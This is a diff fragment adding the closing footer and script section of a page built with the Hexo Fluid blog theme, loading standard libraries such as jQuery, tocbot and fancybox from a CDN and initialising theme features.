+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
